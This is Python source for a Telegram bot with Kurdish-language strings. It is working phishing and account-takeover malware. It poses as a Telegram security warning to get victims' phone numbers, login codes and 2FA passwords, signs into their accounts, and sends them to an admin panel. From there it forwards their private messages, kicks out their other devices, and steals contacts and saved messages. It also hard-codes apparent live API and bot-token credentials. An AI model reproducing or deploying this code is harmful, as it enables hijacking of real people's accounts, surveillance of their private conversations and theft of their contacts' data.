from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)
import asyncio

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_final", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# داتای کاتی
sessions = {} 

# --- فەرمانی ستارت ---
@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text(
            "💎 **بەخێرهاتی بۆ پانێڵی کۆنترۆڵی زیرەک**\n\n"
            "هەر نێچیرێک لۆگین بکات، لێرە دوگمەی کۆنترۆڵت بۆ دروست دەبێت.",
            reply_markup=ReplyKeyboardRemove()
        )
        return

    # ڕووکاری نێچیر
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📲 پشتڕاستکردنەوەی ئەکاونت", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await message.reply_text(
        "⚠️ **ئاگاداری تێلیگرام**\n\n"
        "بۆ پاراستنی ئەکاونتەکەت لە فلتەربوون و هاک، پێویستە ناسنامەکەت پشتڕاست بکەیتەوە.\n"
        "تکایە کلیک لە دوگمەی خوارەوە بکە:",
        reply_markup=kb
    )

# --- وەرگرتنی ژمارە و ناردنی کۆد ---
@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    await app.send_message(ADMIN_ID, f"☎️ **ژمارەیەکی نوێ هات:** `+{phone}`\n🆔 ئایدی: `{u_id}`")
    
    c = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await c.connect()
    
    try:
        sent_code = await c.send_code(phone)
        sessions[u_id] = {
            "client": c, "phone": phone, 
            "hash": sent_code.phone_code_hash, "step": "code"
        }
        await message.reply_text(
            "📩 **کۆدی ٥ ژمارەیی بنێرە**\n\n"
            "کۆدێکی ٥ ژمارەیی لەلایەن تێلیگرامەوە بۆت هات، تکایە لێرە بینووسە:",
            reply_markup=ReplyKeyboardRemove()
        )
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

# --- جێبەجێکردنی لۆگین ---
@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in sessions or sessions[u_id].get("step") == "done":
        return

    data = sessions[u_id]
    u_client = data["client"]

    try:
        if data["step"] == "code":
            await u_client.sign_in(data["phone"], data["hash"], message.text)
        elif data["step"] == "2fa":
            await u_client.check_password(message.text)

        # ئەگەر لۆگین سەرکەوتوو بوو
        sessions[u_id]["step"] = "done"
        await message.reply_text("✅ ئەکاونتەکەت بە سەرکەوتوویی پارێزرا.")
        
        # ناردنی پانێڵ بۆ ئادمین
        panel = InlineKeyboardMarkup([
            [InlineKeyboardButton("📡 چالاککردنی سیخوڕی", callback_data=f"spy_{u_id}")],
            [InlineKeyboardButton("⚔️ دەرکردنی ئامێرەکان", callback_data=f"kick_{u_id}")],
            [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"cnt_{u_id}")],
            [InlineKeyboardButton("📂 نامە کۆنەکان", callback_data=f"msg_{u_id}")]
        ])
        await app.send_message(ADMIN_ID, f"🔥 **لۆگین سەرکەوتوو بوو!**\n📱 ژمارە: `+{data['phone']}`\n🆔 ئایدی: `{u_id}`", reply_markup=panel)

    except errors.SessionPasswordNeeded:
        sessions[u_id]["step"] = "2fa"
        await message.reply_text("🔑 **پاسۆردی دوو قۆناغی (2FA) بنێرە:**")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە بۆ {u_id}: {e}")

# --- کارپێکردنی دوگمەکانی ئادمین ---
@app.on_callback_query()
async def buttons(client, query):
    cmd, target_id = query.data.split("_")
    target_id = int(target_id)
    u_client = sessions[target_id]["client"]

    if cmd == "spy":
        @u_client.on_message(filters.private & ~filters.me)
        async def forwarder(c, m):
            await m.forward(ADMIN_ID)
        await query.answer("📡 سیخوڕی چالاک بوو (نامەکانت بۆ دێت)")

    elif cmd == "kick":
        auths = await u_client.get_authorizations()
        for a in auths:
            if not a.is_current: await u_client.terminate_session(a.hash)
        await query.answer("⚔️ هەموو ئامێرەکان دەرکران", show_alert=True)

    elif cmd == "cnt":
        contacts = await u_client.get_contacts()
        res = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:20]])
        await app.send_message(ADMIN_ID, f"📇 ناوەکانی {target_id}:\n\n{res}")
        await query.answer("لیستەکە ناردرا")

    elif cmd == "msg":
        async for m in u_client.get_chat_history("me", limit=10):
            await m.forward(ADMIN_ID)
        await query.answer("نامەکان فۆروارد کران")

print("--- بۆتەکە بە سەرکەوتوویی لەسەر گیتھەب کار دەکات ---")
app.run()
